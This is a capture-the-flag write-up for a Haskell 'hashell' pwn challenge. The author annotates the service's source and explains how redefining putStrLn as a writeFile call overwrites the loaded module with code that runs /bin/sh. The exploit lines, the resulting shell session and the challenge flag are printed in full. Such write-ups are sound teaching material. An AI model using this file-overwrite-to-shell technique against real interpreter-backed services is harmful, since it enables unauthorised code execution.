# hashell

[library.m0unt41n.ch/challenges/hashell](https://library.m0unt41n.ch/challenges/hashell) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

We get a Haskell program. And I have no idea about Haskell &#128578;

```
This is Big Boss... You should be near a enemy Terminal, PWN it and gather information
about the Metal Gear. We are able to intersect some enemy communication and record the
following: "The world should only have the State of Outer Heaven, all others are states
are a blasphemy against our great Nation. That's why our server runs on Haskell"
```

# Refactoring the code
With quite a bit of Google search, moving around and annotating, the program becomes somewhat readable:

```haskell
import Control.Monad
import Control.Exception (try, SomeException)
import Language.Haskell.Interpreter
import Language.Haskell.Interpreter.Unsafe
import Text.Parsec
import Text.Parsec.String (Parser)
import System.IO
import Data.List
import qualified Data.Text as T
import qualified Data.Text.IO as TIO
import System.Posix.Signals
import System.Posix.Process
import System.Exit (ExitCode(..), exitSuccess)
import Control.Concurrent
import System.Posix.Process

-- Define "Input" data type as union of Function and Executable
data Input = Function String | Executable String deriving (Show, Eq)


-------------------------------------------------------------------------
-- Some self-standing helper functions                                 --
-------------------------------------------------------------------------

-- Simple test
isNotAnEqualSign x = x /= '='

-- Split <str> on first space
splitStringOnFirstSpace :: String -> (String, String)
splitStringOnFirstSpace str = let (before, after) = break (== ' ') str in (before, dropWhile (== ' ') after)

-- Split <str> on first '='
splitStringOnFirstEq :: String -> (String, String)
splitStringOnFirstEq str = let (before, after) = break (== '=') str in (takeWhile (/= ' ') before, after)

-- Read line no. <arg2> from file handle <arg1>
readLines :: Handle -> Int -> IO String
readLines handle i
  | i < 1 = return ""
  | otherwise = do
      line <- hGetLine handle
      if i == 1
        then return line
        else readLines handle (i - 1)

-- Read line no. <arg1> from 'functions.hs'
getLineNr :: Int -> IO String
getLineNr i = withFile "./functions.hs" ReadMode $ \handle -> do
  line <- readLines handle i
  return line

-- Check if first line of 'functions.hs' contains arg1
isMyFunction :: String -> IO Bool
isMyFunction arg1 = do
  line <- getLineNr 1
  return ((" " ++arg1++",") `isInfixOf` line)

-- Check if a) first line of 'functions.hs' contains <arg1> and b) that <arg2> does not contain `
isFunctionAllowed :: String -> String -> IO Bool
isFunctionAllowed arg1 arg2 = do
  line <- getLineNr 1
  return (((" " ++arg1++",") `isInfixOf` line) && (not (("`" `isInfixOf` arg2))))

-- Append <content> to 'functions.hs'
appendStringToFunctionsHs :: String -> IO ()
appendStringToFunctionsHs content = do
  withFile "./functions.hs" AppendMode $ \handle -> do
    hPutStrLn handle (content ++ "\n")

-- Replace arg1 with arg2 in 'functions.hs'
replaceStringInFunctionsHs :: String -> String -> IO ()
replaceStringInFunctionsHs s news = do
  let filePath = "./functions.hs"
  contents <- TIO.readFile filePath
  let updatedContents = T.replace (T.pack s) (T.pack news) contents
  TIO.writeFile filePath updatedContents

-- Restore `functions.hs` to original contents
terminationHandler :: IO ()
terminationHandler = do
  sourceContent <- readFile "./recover_original.hs"
  writeFile "./functions.hs" sourceContent
  putStrLn "Termination signal received. Exiting..."
  exitImmediately ExitSuccess


-------------------------------------------------------------------------
-- Functions for adding user-provided code to 'functions.hs'           --
-------------------------------------------------------------------------

-- Return list of all imports from Prelude (as string)
allExportsFromPrelude = do
  i <- runInterpreter (getModuleExports "Prelude")
  case i of
    Left err -> return $ show ([] :: [()])
    Right result -> return $ show result

-- Check if function we want to add is also in Prelude
isImportedFromPrelude fun = do 
  imports <- allExportsFromPrelude
  return $ fun `isInfixOf` imports

-- Add function passed as <arg> to 'functions.hs':
--     *   if it is blacklisted (first line), return error
--     *   if it is in Prelude, add to exception list ('hiding')
--     *   append function text to the end of file
addFunctionToFunctionsHs arg = do
  let (command, arguments) = splitStringOnFirstEq arg
  isMy <- isMyFunction command
  if isMy
    -- Protect built-ins (listed in first line)
    then putStrLn "Error: can't modify my stuff"
    else do
      overshadow <- isImportedFromPrelude ("\""++(command++"\""))
      if overshadow
        then do
          -- If what we're adding is imported from Prelude, add it to exclusion list in functions.hs
          line <- getLineNr 6
          let updatedLine = init line ++ ","++ command ++ ")"
          replaceStringInFunctionsHs line updatedLine
          appendStringToFunctionsHs arg
        else appendStringToFunctionsHs arg


-------------------------------------------------------------------------
-- Functions for executing user inputs in context of 'functions.hs'    --
-- What is happening here:                                             --
--     *   First, check if user is trying to call an allowed function  --
--     *   Execute with 'interpret'                                    --
--     *   If that fails, execute with 'eval'                          --
-- (I am not sure what is the difference between the two)              --
-------------------------------------------------------------------------

execFunctionWithInterpret :: String -> IO ()
execFunctionWithInterpret arg = do
  r <- runInterpreter $ do
    loadModules ["functions.hs"]
    setTopLevelModules ["Functions"]
    result <- interpret arg (as :: IO ())
    liftIO result
  case r of
    Left err -> execFunctionWithEval arg 
    Right result  -> putStrLn $ "Result from interpret: " ++ show result

execFunctionWithEval :: String -> IO ()
execFunctionWithEval arg = do
  r <- runInterpreter $ do
    loadModules ["functions.hs"]
    setTopLevelModules ["Functions"]
    exprResult <- eval arg
    return exprResult
  case r of
    Left err -> putStrLn $ "Error from eval: " ++ show err
    Right result -> putStrLn $ "Result from eval: " ++ show result

execFunction arg = do
  let (command, arguments) = splitStringOnFirstSpace (arg++" ")
  isMy <- isFunctionAllowed command arg
  if isMy
    then execFunctionWithInterpret arg
    else putStrLn "Error: what, are my functions not good enough for you?"


-------------------------------------------------------------------------
-- User input and parsing                                              --
-------------------------------------------------------------------------

-- Execute user input (two variants, depending on type)
addOrExecUserInput :: Input -> IO ()
addOrExecUserInput (Function str) = do
  addFunctionToFunctionsHs str
addOrExecUserInput (Executable str) = execFunction str

-- Parse a string into an Input object of either type
parseFunction = do lhs <- many1 (satisfy isNotAnEqualSign) 
                   char '='
                   rhs <- many1 anyChar
                   return (Function (lhs ++ "=" ++ rhs))

parseExecutable = do e <- many1 (satisfy isNotAnEqualSign)
                     return (Executable e)
parseInput = Text.Parsec.try parseFunction <|>  parseExecutable

-- Parse user input and execute it (either way)
parseInputAndExecute :: String -> IO ()
parseInputAndExecute input =
    case parse parseInput "" input of
        Left err -> putStrLn $ "Parse error: " ++ show err
        Right parsedInput -> addOrExecUserInput parsedInput


-------------------------------------------------------------------------
-- Main program                                                        --
-------------------------------------------------------------------------

-- Input loop: read line, trim t, run 'evaluate' on it
loop :: IO ()
loop = do
  putStr "> "
  hFlush stdout
  input <- getLine
  let (before, after) = break (== '\n') input
  parseInputAndExecute before
  loop

-- Main program
main :: IO ()
main = do
  installHandler sigTERM (Catch terminationHandler) Nothing
  installHandler sigINT (Catch terminationHandler) Nothing
  loop
```

# Program analysis

What is going on is roughly:

*   User can type simple Haskell functions that will be added to `functions.hs` in runtime
*   User can type expressions, which will be executed in context of `functions.hs`
*   `functions.hs` has a flag, but no obvious way to get it.

There are plenty of safeguards

*   We can only execute functions that are whitelisted in first line of `functions.hs`
    (which raises a question: why even provide facility to define custom ones?)
*   We can not overwrite any of these whitelisted functions
*   The context (`functions.hs`) is very limited, we can't easily import additional modules
    there, e.g. to do I/O. Only Prelude (default Haskell library) is available.
*   We **can** overwrite functions from Prelude - they get added to `hiding ()` list then.

There are some unknowns and complexities (mostly: because I have no idea about Haskell)

*   There are actually **two** functions for executing an user-defined function, one uses
    `interpret` and other one uses `eval`. I don't understand the difference.
*   All that uses plenty of Haskel-specific syntax &#128578;

Some library documentations that I looked at when searching:

*   [Language.Haskell.Interpreter](https://hackage.haskell.org/package/hint-0.9.0.8/docs/Language-Haskell-Interpreter.html)
*   [IO.Handle](https://hackage.haskell.org/package/base-4.20.0.1/docs/GHC-IO-Handle.html)
*   [System.Posix.Process](https://downloads.haskell.org/~ghc/9.6.5/docs/libraries/unix-2.8.4.0/System-Posix-Process.html)
*   [Prelude](https://hackage.haskell.org/package/base-4.20.0.1/docs/Prelude.html)


# Running it locally

There is a Docker file attached, but we can simply build and run the program locally:

```bash
$ dnf install ghc ghc-hint-devel
$ ghc -o challenge hashell.hs
```

# Weak spots

Few things to note about the program:

*   It imports several modules that seem unused, but are suspiciously related to typical attack
    vectors:
    *   import System.Posix.Signals
    *   import System.Posix.Process
    *   import Control.Concurrent
*   The story in the challenge mentions "state", and we import `Control.Monad` - which has
    Haskell's `State` object.
*   Most importantly: **we can redefine `putStrLn` and execute it via `ioify`**

How far can we push this? It's mostly down to: how to get the right Haskell syntax for things we want to try &#128578;

## Simple dummy command

First, we can indeed execute *some* code.

```haskell
> putStrLn t = "hi"
> ioIfy "a"
Result from eval: "\"hi\""
```

## readFile

My next attempt was to try [readFile](https://hackage.haskell.org/package/base-4.20.0.1/docs/Prelude.html#v:readFile)
and print `functions.hs` to standard output. I failed badly thought, could not get the right syntax for the result

## writeFile

Then I saw that [writeFile](https://hackage.haskell.org/package/base-4.20.0.1/docs/Prelude.html#v:writeFile) does not
need to deal with result &#128578; and just need to strings

```haskell
> putStrLn t = writeFile "test" "blah"
> ioIfy "a"
Result from interpret: ()
```

... which created the file. Can we write newlines though? Yes:

```haskell
> putStrLn t = writeFile "test" "blah\nblah"
> ioIfy "a"
Result from interpret: ()
```

OK, so **we have arbitrary write capability**.


# Exploiting

My first attempt was to overwrite the binary file itself:

This won't work (text file busy)
```haskell
> putStrLn f = writeFile "./challenge" "#!/bin/sh\ncat functions.hs"
> ioIfy "a"
```

... but this failed with `text file busy`. There is no point overwriting `hashell.hs`, as it is
compiled only during the container startup. This leaves us with `functions.hs`, which is
dynamically executed from the challenge. Now, this will initially wipe the flag, but... that's where
the "master" copy in `recover_original.hs` will be useful.

What do we put there? With some help from ChatGPT (*write haskell program executing /bin/sh...*), I got:

```haskell
--allowed functions: main,


module Functions where

import Prelude hiding (head, tail)
import System.Process

main :: IO ()
main = do
  exitCode <- system "/bin/sh"
  putStrLn $ show exitCode
```

Note that it is important to keep the first six lines identical to the original program, incl. empty lines:

*   Whitelist of custom functions (except that we only keep ours there)
*   Module name (used when initializing the interpreter)
*   Prelude import (parsed for overshadowed functions - must be in line #6!)

With that, we can try a local exploit:

```haskell
> putStrLn f = writeFile "functions.hs" "--allowed functions: main,\n\n\nmodule Functions where\n\nimport Prelude hiding (head, tail)\nimport System.Process\n\nmain :: IO ()\nmain = do\n  exitCode <- system \"/bin/sh\"\n  putStrLn $ show exitCode\n"
> ioIfy "a"
> main
sh-5.2$ 
```

# Getting the flag

```haskell
$ ncat --ssl 8f98f0ce-e87f-4e81-82e7-7f471e67b4cb.library.m0unt41n.ch 1337
> putStrLn f = writeFile "functions.hs" "--allowed functions: main,\n\n\nmodule Functions where\n\nimport Prelude hiding (head, tail)\nimport System.Process\n\nmain :: IO ()\nmain = do\n  exitCode <- system \"/bin/sh\"\n  putStrLn $ show exitCode\n"
putStrLn f = writeFile "functions.hs" "--allowed functions: main,\n\n\nmodule Functions where\n\nimport Prelude hiding (head, tail)\nimport System.Process\n\nmain :: IO ()\nmain = do\n  exitCode <- system \"/bin/sh\"\n  putStrLn $ show exitCode\n"
> ioIfy "a"
ioIfy "a"
Result: ()
> main
main
ls
ls
Dockerfile  functions.hs  hashell.hs  recover_original.hs
challenge   hashell.hi	  hashell.o
cat recover_original.hs
grep password recover_original.hs
grep password recover_original.hs
 | password == "shc2023{https://www.youtube.com/watch?v=Ci48kqp11F8}" =  "Must have been the wind" 
 | password == "shc2023{https://www.youtube.com/watch?v=Ci48kqp11F8}" = "The great weapon the Metal Gear can be accessed over the Hyper Text Transfer Protocol."
```

---

## `shc2023{https://www.youtube.com/watch?v=Ci48kqp11F8}`

(yes, it's actually the YT URL)



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
